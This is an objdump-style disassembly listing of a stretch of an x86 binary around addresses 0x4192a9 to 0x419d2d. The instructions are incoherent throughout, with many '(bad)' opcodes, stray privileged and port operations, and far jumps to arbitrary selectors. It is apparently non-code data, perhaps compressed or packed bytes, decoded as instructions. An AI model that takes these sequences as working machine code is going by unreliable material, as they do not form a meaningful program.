  4192a9:	in     al,dx
  4192aa:	mov    ds:0xa99d136e,eax
  4192af:	out    0x2b,eax
  4192b1:	jle    0x419332
  4192b3:	(bad)  
  4192b5:	lds    ebp,FWORD PTR [edx+0x7c]
  4192b8:	(bad)  
  4192b9:	shl    dh,cl
  4192bb:	out    0x8,al
  4192bd:	jp     0x4192a2
  4192bf:	je     0x419276
  4192c1:	xor    bl,bh
  4192c3:	repnz fcmovnu st,st(0)
  4192c6:	pop    ebp
  4192c7:	aam    0x8a
  4192c9:	sbb    eax,0x7b47313c
  4192ce:	jmp    0x2359:0xe1f1d891
  4192d5:	leave  
  4192d6:	jmp    0x96eb:0x7589e7e8
  4192dd:	xchg   dl,dh
  4192df:	sbb    al,0xc2
  4192e1:	mov    esp,0x3504d911
  4192e6:	jp     0x419286
  4192e8:	stc    
  4192e9:	jecxz  0x4192f7
  4192eb:	push   ebx
  4192ec:	inc    eax
  4192ed:	loope  0x4192ef
	...
  419353:	add    BYTE PTR [eax],al
  419355:	add    BYTE PTR [eax-0xcc4519],ah
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	mov    DWORD PTR [ecx-0x6d],esi
  419365:	dec    ebx
  419366:	sgdtd  [bx+si]
  41936a:	add    BYTE PTR [ecx],al
  41936c:	add    BYTE PTR [eax],al
  41936e:	mov    cl,0x5
  419370:	clc    
  419371:	cmp    BYTE PTR [eax+0x74c9c67e],0xd0
  419378:	ins    DWORD PTR es:[edi],dx
  419379:	push   cs
  41937a:	inc    edi
  41937b:	mov    ds:0xb3859d3f,eax
  419380:	and    ch,ah
  419382:	xchg   esp,eax
  419383:	xor    al,0x12
  419385:	popa   
  419386:	inc    eax
  419387:	sub    eax,0x9219a74e
  41938c:	or     edx,eax
  41938e:	ins    DWORD PTR es:[edi],dx
  41938f:	push   ss
  419390:	mov    esp,DWORD PTR [ebx-0xb33a89b]
  419396:	(bad)  
  419397:	sbb    al,0xf6
  419399:	cmp    edi,0xa02f7573
  41939f:	pusha  
  4193a0:	fnsave [esi-0x5f]
  4193a3:	dec    edx
  4193a4:	les    edx,FWORD PTR [esi-0x23]
  4193a7:	fld    QWORD PTR [esi+0x24ef4056]
  4193ad:	pop    esi
  4193ae:	mov    cl,0xd
  4193b0:	dec    esi
  4193b1:	inc    esp
  4193b2:	mov    ebx,0x611997c0
  4193b7:	fnsave [ecx+0x51]
  4193ba:	je     0x4193c5
  4193bc:	sahf   
  4193bd:	pop    ss
  4193be:	cs dec ebx
  4193c0:	xor    al,0x9f
  4193c2:	xchg   esp,eax
  4193c3:	mov    bl,BYTE PTR [ecx+ebp*8+0x25cb6c2f]
  4193ca:	mov    bl,0x3b
  4193cc:	cs xchg esi,eax
  4193ce:	xor    eax,0xfc5e89c6
  4193d3:	mov    cl,0x1a
  4193d5:	push   edx
  4193d6:	dec    esp
  4193d7:	pop    DWORD PTR [edi]
  4193d9:	xchg   ebx,eax
  4193da:	add    ah,BYTE PTR [ebp-0x56]
  4193dd:	mov    bh,BYTE PTR [eax]
  4193df:	inc    ecx
  4193e0:	into   
  4193e1:	ss clc 
  4193e3:	and    eax,DWORD PTR [esi-0x185212c0]
  4193e9:	adc    ebp,DWORD PTR [ebp+ebx*4-0x3f]
  4193ed:	xchg   edx,eax
  4193ee:	pop    es
  4193ef:	mov    cl,0xb5
  4193f1:	push   edx
  4193f2:	rcl    DWORD PTR [ebx],1
  4193f4:	cdq    
  4193f5:	mov    esi,0x9997b69e
  4193fa:	mov    ebx,0x7352e275
  4193ff:	sub    DWORD PTR [edx],eax
  419401:	stos   DWORD PTR es:[edi],eax
  419402:	xor    DWORD PTR [edi+0x390d9081],edx
  419408:	cmp    BYTE PTR [edx],bh
  41940a:	(bad)  
  41940b:	sbb    BYTE PTR [edx],dl
  41940d:	mov    cs,WORD PTR [ecx-0x1e63ed21]
  419413:	xchg   DWORD PTR [edx+0x31908f43],ebx
  419419:	ja     0x4193be
  41941b:	ficom  WORD PTR [bx-0x6d2d]
  419420:	les    ebx,FWORD PTR [esi+0x672a351d]
  419426:	rcl    DWORD PTR [eax-0x6a0df68a],cl
  41942c:	sub    eax,0x8585b661
  419431:	pop    ebp
  419432:	ss mov edx,0x4cfdb409
  419438:	bound  ebp,QWORD PTR [ecx+ecx*2+0x27]
  41943c:	das    
  41943d:	xchg   edx,eax
  41943e:	retf   0x267d
  419441:	cmp    eax,0x3a419cce
  419446:	sub    al,0xf7
  419448:	bound  eax,QWORD PTR ds:0xbe908935
  41944e:	ins    DWORD PTR es:[edi],dx
  41944f:	mov    al,ds:0xb512088c
  419454:	push   ebx
  419455:	test   eax,0x4043d855
  41945a:	mov    ds:0xdaf3ff74,al
  41945f:	int    0x2b
  419461:	fidivr WORD PTR [eax-0x54fac30c]
  419467:	sub    cl,cl
  419469:	xchg   BYTE PTR [ebx],ch
  41946b:	pop    esi
  41946c:	and    DWORD PTR [ebp+0x0],esi
	...
  4194d6:	cmp    eax,0xed3a6998
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	(bad)  
  4194e3:	fldcw  WORD PTR [edx]
  4194e5:	cwde   
  4194e6:	adc    BYTE PTR [bx+di],al
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    DWORD PTR [eax],eax
  4194ed:	add    BYTE PTR [esi+eiz*2+0x3fc97a8],al
  4194f4:	add    al,0xc
  4194f6:	mov    ds:0x7f2c6dda,eax
  4194fb:	outs   dx,BYTE PTR ds:[esi]
  4194fc:	jo     0x419482
  4194fe:	xchg   ebp,eax
  4194ff:	push   es
  419500:	fwait
  419501:	or     eax,0xef93fccf
  419506:	mov    ah,BYTE PTR [ecx+ebx*1+0x319fa746]
  41950d:	jns    0x4194f6
  41950f:	mov    dl,0x2b
  419511:	cmp    DWORD PTR [ecx+ecx*8-0x7b15f4dc],0x5543619e
  41951c:	clc    
  41951d:	retf   
  41951e:	pop    ebp
  41951f:	call   0xe465ce4
  419524:	iret   
  419525:	adc    eax,0x2fe5e673
  41952a:	loope  0x4194f9
  41952c:	out    0x37,eax
  41952e:	out    dx,al
  41952f:	data16 add al,0x5c
  419532:	(bad)
  419536:	ja     0x41950b
  419538:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41953a:	mov    dl,0x7a
  41953c:	mov    cl,0x5c
  41953e:	test   eax,0xf7afb9c8
  419543:	xor    BYTE PTR [edx-0x5a318d69],bh
  419549:	retf   
  41954a:	pop    ebp
  41954b:	retf   0x447
  41954e:	arpl   WORD PTR [edi-0x69],dx
  419551:	cmp    BYTE PTR [eax-0x14],al
  419554:	mov    al,0xcb
  419556:	jp     0x4195d2
  419558:	xlat   BYTE PTR ds:[ebx]
  419559:	xchg   edx,eax
  41955a:	and    eax,ebp
  41955c:	stc    
  41955d:	test   esi,esi
  41955f:	inc    ebp
  419560:	push   ds
  419561:	xchg   ebp,eax
  419562:	cmp    BYTE PTR gs:[ecx],ch
  419565:	lahf   
  419566:	outs   dx,BYTE PTR ds:[esi]
  419567:	add    ch,dl
  419569:	loopne 0x4195b6
  41956b:	arpl   WORD PTR [ebx-0x2bf5cc4b],di
  419571:	test   DWORD PTR [ecx-0x49],esp
  419574:	sub    al,0xa8
  419576:	sub    eax,0x2b87718c
  41957b:	es data16 aam 0x13
  41957f:	gs xor al,0x86
  419582:	js     0x4195d7
  419584:	mov    al,ds:0xbbaebe35
  419589:	mov    DWORD PTR [esp+edx*1-0x56],edi
  41958d:	sbb    eax,0x9be6f56c
  419592:	fcmove st,st(6)
  419594:	adc    BYTE PTR [edx],dh
  419596:	cmp    eax,0x183e2953
  41959b:	mov    edx,0xd49d63ff
  4195a0:	int    0xe2
  4195a2:	adc    BYTE PTR [eax+0xd],bl
  4195a5:	scas   al,BYTE PTR es:[edi]
  4195a6:	push   edi
  4195a7:	imul   ebp,DWORD PTR [ecx+0x4c],0x9809d829
  4195ae:	xor    ebp,DWORD PTR [ebp-0x576fe14a]
  4195b4:	fs sub al,0xa8
  4195b7:	or     ah,BYTE PTR [ebx-0x8]
  4195ba:	and    DWORD PTR [edi+0x5c6c0062],ebx
  4195c0:	rol    bl,cl
  4195c2:	je     0x4195a2
  4195c4:	cmp    esi,DWORD PTR [ebx]
  4195c6:	sub    BYTE PTR [esi-0x70],cl
  4195c9:	imul   esi,DWORD PTR [edi+0x12],0xfffffffb
  4195cd:	push   esi
  4195ce:	or     eax,0xf563393e
  4195d3:	push   ds
  4195d4:	js     0x4195c1
  4195d6:	retf   0xadf4
  4195d9:	pop    ss
  4195da:	test   DWORD PTR [ebx-0x4058463c],ebx
  4195e0:	xchg   edi,eax
  4195e1:	mov    eax,0x9f897789
  4195e6:	aad    0x82
  4195e8:	hlt    
  4195e9:	ret    
  4195ea:	xchg   esp,eax
  4195eb:	ja     0x41963f
  4195ed:	iret   
	...
  419656:	scas   eax,DWORD PTR es:[edi]
  419657:	aam    0x8d
  419659:	(bad)  
  41965a:	(bad)  
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	sub    eax,0x67fe715f
  419667:	adc    DWORD PTR [ecx],eax
  419669:	add    BYTE PTR [eax],al
  41966b:	add    DWORD PTR [eax],eax
  41966d:	add    BYTE PTR ds:0x981e4fa2,dl
  419673:	sbb    BYTE PTR [edi],dl
  419675:	dec    ebx
  419676:	les    esi,FWORD PTR [edx]
  419678:	dec    edi
  419679:	xchg   ebp,eax
  41967a:	cmp    bl,BYTE PTR [ebp+0x7a68e9db]
  419680:	pop    esp
  419681:	popf   
  419682:	cld    
  419683:	lods   eax,DWORD PTR ds:[esi]
  419684:	inc    edx
  419685:	ds cmp al,0xed
  419688:	cpuid  
  41968a:	stc    
  41968b:	shr    DWORD PTR [edi],0xb3
  41968e:	sub    esp,DWORD PTR [edi-0x43]
  419691:	dec    ebp
  419692:	or     eax,0x31f0d15
  419697:	and    dh,ch
  419699:	push   esi
  41969a:	push   0xcf2e3ae2
  41969f:	jno    0x419696
  4196a1:	sub    BYTE PTR [eax+0x26],ah
  4196a4:	pop    ds
  4196a5:	loop   0x41970b
  4196a7:	inc    edi
  4196a8:	mov    ds:0x850d0862,eax
  4196ad:	sti    
  4196ae:	dec    esi
  4196af:	or     ecx,edi
  4196b1:	xchg   ebx,eax
  4196b2:	jbe    0x419693
  4196b4:	xor    ecx,DWORD PTR [ecx-0x3d]
  4196b7:	pop    edx
  4196b8:	retf   0xd252
  4196bb:	js     0x4196cb
  4196bd:	inc    esi
  4196be:	push   ebp
  4196bf:	cmp    al,0x1a
  4196c1:	xlat   BYTE PTR ds:[ebx]
  4196c2:	jmp    0x5a94cdb7
  4196c7:	test   BYTE PTR [edi-0x31930369],ah
  4196cd:	jne    0x419716
  4196cf:	mov    esp,DWORD PTR [esi+0x2]
  4196d2:	popa   
  4196d3:	mov    al,0x94
  4196d5:	or     al,0xb9
  4196d7:	cld    
  4196d8:	adc    ecx,DWORD PTR [ebx+eiz*8-0x1c]
  4196dc:	cmp    ah,dh
  4196de:	xchg   DWORD PTR [ebx+0x334d5b53],ebp
  4196e4:	lods   al,BYTE PTR ss:[esi]
  4196e6:	jae    0x41968c
  4196e8:	scas   al,BYTE PTR es:[edi]
  4196e9:	xlat   BYTE PTR ds:[ebx]
  4196ea:	sbb    BYTE PTR [edi+0x47],ah
  4196ed:	push   eax
  4196ee:	inc    ebp
  4196ef:	push   edi
  4196f0:	hlt    
  4196f1:	call   0x8e5e:0x312865d7
  4196f8:	sub    al,BYTE PTR [esi-0x54]
  4196fb:	aam    0x3b
  4196fd:	cs rcl ah,1
  419700:	fnsave [esi-0x64]
  419703:	cmp    edx,DWORD PTR [edi]
  419705:	jle    0x419709
  419707:	mov    WORD PTR [esi],ds
  419709:	lock sbb BYTE PTR [ebx+edx*2],dl
  41970d:	jge    0x419721
  41970f:	xchg   edx,eax
  419710:	(bad)  
  419711:	(bad)  
  419712:	aad    0x15
  419714:	fbld   TBYTE PTR [esi]
  419716:	pushf  
  419717:	jg     0x419714
  419719:	sbb    bp,bp
  41971c:	mov    ecx,esi
  41971e:	ins    BYTE PTR es:[edi],dx
  41971f:	loop   0x419738
  419721:	dec    esi
  419722:	cmp    bl,BYTE PTR [esp+edx*8]
  419725:	push   ss
  419726:	(bad)  
  419727:	idiv   BYTE PTR [edi+ecx*1+0x79]
  41972b:	(bad)  
  41972c:	pop    ss
  41972d:	jns    0x4196d1
  41972f:	adc    DWORD PTR [ebp-0x5dc306f3],0x10
  419736:	lea    esi,[edx+ecx*1+0x45582415]
  41973d:	mov    eax,ds:0xa34a47a0
  419742:	jne    0x41973f
  419744:	out    dx,eax
  419745:	pop    edi
  419746:	imul   ecx,DWORD PTR [eax-0x63],0xc6bb53ec
  41974d:	imul   esi,DWORD PTR [esi+0x3f221e2b],0x812a6d54
  419757:	loopne 0x4197ba
  419759:	ret    0x3ca8
  41975c:	and    al,0x5f
  41975e:	dec    ecx
  41975f:	mov    eax,ds:0x8d203f7b
  419764:	stos   DWORD PTR es:[edi],eax
  419765:	rcl    DWORD PTR [edi-0xa03b99c],0x54
  41976c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41976d:	pop    ecx
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0x7b8dd0ae
  4197e3:	aad    0xd
  4197e5:	hlt    
  4197e6:	adc    al,BYTE PTR [bx+di]
  4197e9:	add    BYTE PTR [eax],al
  4197eb:	add    DWORD PTR [eax],eax
  4197ed:	add    ch,dh
  4197ef:	inc    ebp
  4197f0:	xchg   edx,eax
  4197f1:	xor    ecx,DWORD PTR [eax+edx*8+0x26]
  4197f5:	int3   
  4197f6:	hlt    
  4197f7:	xchg   ecx,eax
  4197f8:	outs   dx,DWORD PTR ds:[esi]
  4197f9:	xor    bl,dh
  4197fb:	(bad)  
  4197fc:	pop    ebx
  4197fd:	mov    ah,0x9e
  4197ff:	adc    al,0xe7
  419801:	daa    
  419802:	cmp    ch,BYTE PTR ds:0xbef27a22
  419808:	les    ebx,FWORD PTR [edi-0x3a]
  41980b:	mov    ecx,?
  41980d:	xlat   BYTE PTR ds:[ebx]
  41980e:	mov    al,0xb2
  419810:	mov    ecx,0xe9115d47
  419815:	xchg   edi,eax
  419816:	xchg   esi,eax
  419817:	int3   
  419818:	adc    BYTE PTR [edx+0x3f],bh
  41981b:	jge    0x4197c5
  41981d:	(bad)  
  41981e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41981f:	xchg   esp,eax
  419820:	lods   al,BYTE PTR ds:[esi]
  419821:	add    BYTE PTR [eax+0x4128fde5],cl
  419827:	ja     0x419886
  419829:	push   eax
  41982b:	and    eax,0xed6d98e2
  419830:	ins    DWORD PTR es:[edi],dx
  419831:	jg     0x419895
  419833:	mov    edx,0x76cfe223
  419838:	push   ebp
  419839:	ficom  WORD PTR [edi-0x3f6c36f]
  41983f:	in     eax,dx
  419840:	fnstenv [edi+ebx*2-0x35fbbed0]
  419847:	sbb    dl,cl
  419849:	or     BYTE PTR [esi+ebx*8+0x67],bh
  41984d:	inc    edx
  41984e:	add    edx,DWORD PTR [edx-0x5b]
  419851:	jl     0x419841
  419853:	ss jg  0x4198c0
  419856:	add    al,0xc5
  419858:	cdq    
  419859:	add    al,0xd4
  41985b:	out    0x55,eax
  41985d:	out    0xee,al
  41985f:	add    BYTE PTR [esi],ah
  419861:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419862:	shl    DWORD PTR [eax],cl
  419864:	mov    ch,0xf5
  419866:	cmp    DWORD PTR [ebx-0x61b85a01],0xd
  41986d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41986e:	pop    edx
  41986f:	fnstcw WORD PTR [edi]
  419871:	sahf   
  419872:	jne    0x419881
  419874:	shl    DWORD PTR ds:0xc49b8ef3,1
  41987a:	push   0xe463b1f7
  41987f:	sub    DWORD PTR [esi],eax
  419881:	fmul   DWORD PTR [ecx-0xb]
  419884:	pop    ds
  419885:	out    0x93,al
  419887:	daa    
  419888:	je     0x4198b7
  41988a:	jmp    0x2ecb:0x5a81284b
  419891:	add    DWORD PTR ds:[ecx],0xd
  419895:	pusha  
  419896:	push   ebx
  419897:	inc    ebx
  419898:	push   cs
  419899:	test   BYTE PTR [edx-0x439e72c4],al
  41989f:	pop    edx
  4198a0:	xchg   esi,eax
  4198a1:	loopne 0x41983a
  4198a3:	or     DWORD PTR [ebp-0x69af12a7],edi
  4198a9:	and    DWORD PTR [eax+0x2f],0xffffffed
  4198ad:	jle    0x419851
  4198af:	inc    edi
  4198b0:	xor    DWORD PTR [ebx+0x1494a0d4],esp
  4198b6:	dec    ecx
  4198b7:	pop    edx
  4198b8:	inc    edx
  4198b9:	or     dh,BYTE PTR [edi]
  4198bb:	inc    esp
  4198bc:	push   ebp
  4198bd:	add    BYTE PTR [edi-0x53b182a5],al
  4198c3:	mov    esp,0x21cee310
  4198c8:	mov    dl,0x7f
  4198ca:	test   DWORD PTR [ecx-0x2c],edi
  4198cd:	mov    ah,BYTE PTR [esi+0x5b]
  4198d0:	sub    eax,0x4d24d2d6
  4198d5:	pop    es
  4198d6:	mov    eax,ds:0x9fbaf1b9
  4198db:	arpl   WORD PTR [esi],sp
  4198dd:	fwait
  4198de:	pop    ss
  4198df:	add    al,0x4e
  4198e1:	xchg   ebx,eax
  4198e2:	lods   al,BYTE PTR ds:[esi]
  4198e3:	and    BYTE PTR [eax],bl
  4198e5:	jno    0x4198bf
  4198e7:	lock cmp al,0xd3
  4198ea:	xchg   esp,eax
  4198eb:	ins    DWORD PTR es:[edi],dx
  4198ec:	aam    0x46
	...
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fnsave [ebx]
  419963:	sub    BYTE PTR [ebp-0x3c],al
  419966:	adc    eax,DWORD PTR [bx+di]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    BYTE PTR [ecx-0x7b],bl
  419970:	or     ah,cl
  419972:	shl    ecx,1
  419974:	mov    DWORD PTR [edi],edi
  419976:	imul   BYTE PTR [edx]
  419978:	pop    eax
  419979:	aaa    
  41997a:	sub    BYTE PTR [edi-0xa],dl
  41997d:	ret    
  41997e:	addr16 jae 0x4199b5
  419981:	adc    DWORD PTR [edi-0x54d28f33],esp
  419987:	scas   eax,DWORD PTR es:[edi]
  419988:	ss jmp 0x43334066
  41998e:	pop    ss
  41998f:	sbb    eax,0x1f07edb7
  419994:	fwait
  419995:	loop   0x41991e
  419997:	push   ss
  419998:	arpl   WORD PTR [ecx+0x1d56df66],si
  41999e:	jg     0x41993e
  4199a0:	and    bl,BYTE PTR [edx-0x12]
  4199a3:	fidiv  DWORD PTR ds:0xbc2f3c20
  4199a9:	lahf   
  4199aa:	(bad)  
  4199ac:	mov    edi,0xf1d4ce00
  4199b1:	ficomp WORD PTR [eax]
  4199b3:	mov    dh,0x6e
  4199b5:	stos   BYTE PTR es:[edi],al
  4199b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199b7:	dec    edx
  4199b8:	daa    
  4199b9:	pop    eax
  4199ba:	daa    
  4199bb:	adc    bl,BYTE PTR [edi]
  4199bd:	push   eax
  4199be:	or     ecx,DWORD PTR [edx+0x42]
  4199c1:	pop    ecx
  4199c2:	adc    eax,0x40d58315
  4199c7:	cmp    BYTE PTR [esi+esi*1+0x30],ch
  4199cb:	push   ebx
  4199cc:	cs push es
  4199ce:	jecxz  0x419a49
  4199d0:	aaa    
  4199d1:	add    DWORD PTR [eax],esi
  4199d3:	in     al,dx
  4199d4:	sub    eax,0x6b836612
  4199d9:	jle    0x4199ea
  4199db:	xor    DWORD PTR [eax],ecx
  4199dd:	add    BYTE PTR ds:0xb2dc550,dh
  4199e3:	cs cmp bh,bl
  4199e6:	scas   al,BYTE PTR es:[edi]
  4199e7:	pop    ss
  4199e8:	loope  0x419a5e
  4199ea:	stos   BYTE PTR es:[edi],al
  4199eb:	cld    
  4199ec:	push   esp
  4199ed:	sbb    BYTE PTR [ecx+0x2c],0x46
  4199f1:	lahf   
  4199f2:	rcr    DWORD PTR [edx+0x56],cl
  4199f5:	jecxz  0x419a45
  4199f7:	shr    eax,0x48
  4199fa:	jmp    DWORD PTR [ecx+0x360b7aa1]
  419a00:	shl    BYTE PTR [eax+edi*4],0x32
  419a04:	push   edi
  419a05:	leave  
  419a06:	sub    DWORD PTR [esi-0x6e],edx
  419a09:	test   al,0x9f
  419a0b:	mov    al,ds:0x141aed0a
  419a10:	jl     0x4199b3
  419a12:	call   0xe26de525
  419a17:	inc    edx
  419a18:	push   cs
  419a19:	ss xor ah,0xac
  419a1d:	mov    edi,0x2d3b4000
  419a22:	test   bl,ah
  419a24:	test   DWORD PTR [ecx+0x77937a03],edx
  419a2a:	bsf    ebp,DWORD PTR [eax]
  419a2d:	push   ss
  419a2e:	out    dx,eax
  419a2f:	sbb    edi,DWORD PTR [edx+0x739b5cd0]
  419a35:	mov    ds:0x7df69a3c,al
  419a3a:	inc    edx
  419a3b:	aad    0x2
  419a3d:	pop    edx
  419a3e:	dec    edi
  419a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a40:	fsub   QWORD PTR [ebx-0x7e]
  419a43:	pop    es
  419a44:	inc    esi
  419a45:	xchg   DWORD PTR [edx],ebp
  419a47:	dec    esi
  419a48:	inc    ebx
  419a49:	lock adc ebx,DWORD PTR [edi-0x3d]
  419a4d:	sbb    BYTE PTR [eax],ch
  419a4f:	ret    
  419a50:	cmp    ebp,esp
  419a52:	into   
  419a53:	mov    al,0x13
  419a55:	imul   ebx,DWORD PTR [eax+0x5bde2c46],0xda90b60d
  419a5f:	adc    eax,0x7108ab51
  419a64:	retf   0x454c
  419a67:	push   es
  419a68:	xor    al,0x54
  419a6a:	mov    ds:0x238303,eax
	...
  419ad3:	add    BYTE PTR [eax],al
  419ad5:	add    BYTE PTR [ebx],dh
  419ad7:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419add:	test   ebx,0x64c215d3
  419ae3:	add    edi,DWORD PTR [ebp+0x114674e]
  419ae9:	add    BYTE PTR [eax],al
  419aeb:	add    DWORD PTR [eax],eax
  419aed:	add    bh,bh
  419aef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419af0:	fdivrp st(7),st
  419af2:	push   0xffffff95
  419af4:	cld    
  419af5:	ds daa 
  419af7:	sub    eax,0x8057fe2c
  419afc:	inc    esp
  419afd:	mov    dl,0xea
  419aff:	xchg   ebp,eax
  419b00:	iret   
  419b01:	ret    0x6344
  419b04:	xchg   DWORD PTR [edi-0x31c4a14f],edx
  419b0a:	lahf   
  419b0b:	push   0x2d94510a
  419b10:	test   DWORD PTR [edi+ebp*8],eax
  419b13:	leave  
  419b14:	cmp    al,0x25
  419b16:	outs   dx,BYTE PTR ds:[esi]
  419b17:	outs   dx,BYTE PTR ds:[esi]
  419b18:	jp     0x419b54
  419b1a:	nop
  419b1b:	push   ebp
  419b1c:	cdq    
  419b1d:	mov    cl,0xbf
  419b1f:	xchg   ecx,eax
  419b20:	outs   dx,BYTE PTR ds:[esi]
  419b21:	jnp    0x419aef
  419b23:	mov    bh,0x6a
  419b25:	mov    bh,BYTE PTR [edx-0x2ae750d6]
  419b2b:	jp     0x419b94
  419b2d:	ret    0xe59b
  419b30:	fstp   TBYTE PTR [ebx]
  419b32:	dec    edx
  419b33:	mov    dh,0x90
  419b35:	pushf  
  419b36:	sahf   
  419b37:	mov    ecx,0x8f7c7982
  419b3c:	and    DWORD PTR [edi+esi*8],0x9a5a8bbd
  419b43:	pop    ss
  419b44:	pop    ds
  419b45:	push   0x7f
  419b47:	sub    ch,BYTE PTR [ebp+0x1d]
  419b4a:	rcr    edi,cl
  419b4c:	mov    bh,al
  419b4e:	or     al,0x43
  419b50:	repz (bad) 
  419b52:	loopne 0x419b86
  419b54:	int3   
  419b55:	dec    edi
  419b56:	stos   BYTE PTR es:[edi],al
  419b57:	mov    dh,0x5d
  419b59:	psubusw mm7,mm6
  419b5c:	adc    DWORD PTR [edx],edx
  419b5e:	shl    BYTE PTR [esi],1
  419b60:	add    DWORD PTR [eax],esi
  419b62:	cmp    DWORD PTR [edi-0x32],eax
  419b65:	jmp    0xd51ec78f
  419b6a:	mov    cl,0xc6
  419b6c:	jg     0x419b10
  419b6e:	aam    0x6e
  419b70:	add    eax,0x30fe6fe7
  419b75:	mov    esp,0xf85f53fd
  419b7a:	or     al,0x9c
  419b7c:	stc    
  419b7d:	sbb    DWORD PTR [ebp+edx*1-0x18],edi
  419b81:	and    edi,ebx
  419b83:	mul    BYTE PTR ds:0x45daf2b7
  419b89:	push   0x9708ab1e
  419b8e:	adc    al,0xb7
  419b90:	fucomi st,st(1)
  419b92:	push   ss
  419b93:	pop    ebp
  419b94:	sub    eax,DWORD PTR [ebx+0xf89f4dc]
  419b9a:	popa   
  419b9b:	add    esp,DWORD PTR [eax-0x446a696c]
  419ba1:	sbb    ebx,DWORD PTR [ebx]
  419ba3:	dec    ecx
  419ba4:	aas    
  419ba5:	js     0x419b56
  419ba7:	push   eax
  419ba8:	mov    edi,0xeb0f7abe
  419bad:	les    eax,FWORD PTR [eax]
  419baf:	dec    esp
  419bb0:	or     BYTE PTR [ecx],0xb4
  419bb3:	out    0x8f,al
  419bb5:	ret    0xa51f
  419bb8:	push   0xffffffbf
  419bba:	mov    edx,0x4f0fe398
  419bbf:	jmp    0xb72ad759
  419bc4:	jb     0x419c1b
  419bc6:	adc    DWORD PTR [edi+0x13],ebp
  419bc9:	test   BYTE PTR [eax],0x1e
  419bcc:	cmp    eax,0x649c2a9c
  419bd1:	fisttp DWORD PTR [ebp-0x7a]
  419bd4:	adc    DWORD PTR [eax],ebp
  419bd6:	jne    0x419b6d
  419bd8:	dec    ebx
  419bd9:	pop    ecx
  419bda:	aad    0x31
  419bdc:	scas   al,BYTE PTR es:[edi]
  419bdd:	repz aas 
  419bdf:	test   eax,0xf0271de
  419be4:	aad    0x2d
  419be6:	sbb    al,0xde
  419be8:	jae    0x419bc8
  419bea:	aas    
  419beb:	mov    ah,BYTE PTR [edi]
  419bed:	popf   
	...
  419c56:	dec    edx
  419c57:	(bad)  
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0x41
  419c63:	mov    ?,edx
  419c65:	jb     0x419cce
  419c67:	adc    eax,0x1000001
  419c6c:	add    BYTE PTR [eax],al
  419c6e:	int    0xcf
  419c70:	pop    esi
  419c71:	fcom   DWORD PTR [ecx-0x6ce9f6da]
  419c77:	pop    edx
  419c78:	cwde   
  419c79:	adc    esp,ebp
  419c7b:	mov    al,ds:0xcb56274e
  419c80:	sahf   
  419c81:	shl    BYTE PTR [ecx+0x7c],1
  419c84:	inc    esi
  419c85:	sbb    eax,0x6b095ec8
  419c8a:	mov    ch,0x53
  419c8c:	les    ebp,FWORD PTR [eax+0x604e0fd]
  419c92:	sbb    edi,DWORD PTR [edi+0x2b]
  419c95:	iret   
  419c96:	mov    ds:0x53877193,eax
  419c9b:	(bad)  
  419c9d:	daa    
  419c9e:	std    
  419c9f:	fwait
  419ca0:	mov    DWORD PTR [edx+edx*2],0x86fcfd5f
  419ca7:	neg    bl
  419ca9:	mov    ds:0x40f11d5b,al
  419cae:	rol    BYTE PTR [ecx+ebx*4+0x3fa5e6b9],1
  419cb5:	imul   ecx,edi,0x323dab62
  419cbb:	leave  
  419cbc:	aaa    
  419cbd:	adc    al,dh
  419cbf:	out    dx,al
  419cc0:	int    0x43
  419cc2:	dec    ebx
  419cc3:	push   eax
  419cc4:	fadd   DWORD PTR [ecx+ebx*4]
  419cc7:	rcl    BYTE PTR [edi+edi*4-0x45392692],1
  419cce:	jmp    0x419d0f
  419cd0:	mov    dl,0xd5
  419cd2:	lods   eax,DWORD PTR ds:[esi]
  419cd3:	fld    TBYTE PTR [ebx+0x7960e9fc]
  419cd9:	mov    dl,0x94
  419cdb:	cmp    eax,0xc2a08e18
  419ce0:	push   ecx
  419ce1:	xchg   ecx,eax
  419ce2:	jmp    0x6ca38b4d
  419ce7:	daa    
  419ce8:	iret   
  419ce9:	jne    0x419c8c
  419ceb:	inc    ebp
  419cec:	(bad)  
  419ced:	cmp    al,0x2a
  419cef:	mov    esp,0x306c2d80
  419cf4:	(bad)  
  419cf5:	xor    BYTE PTR [eax],cl
  419cf7:	xchg   edx,eax
  419cf8:	sub    al,ch
  419cfa:	es jo  0x419d69
  419cfd:	or     al,0x1e
  419cff:	push   es
  419d00:	inc    eax
  419d01:	int3   
  419d02:	rol    dl,0xbf
  419d05:	movd   DWORD PTR [esi+0x2bf19f89],mm1
  419d0c:	test   al,0xb2
  419d0e:	sub    esp,ebx
  419d10:	inc    ebx
  419d11:	adc    edx,DWORD PTR [ebp+0x67958f07]
  419d17:	or     BYTE PTR ds:0xcf7f95e3,0x28
  419d1e:	add    BYTE PTR [ecx+0x4],cl
  419d21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d22:	jl     0x419ced
  419d24:	in     al,0xaf
  419d26:	push   esp
  419d27:	mov    dl,0x2
  419d29:	das    
  419d2a:	stc    
  419d2b:	or     BYTE PTR [edx],bl
  419d2d:	inc    esp
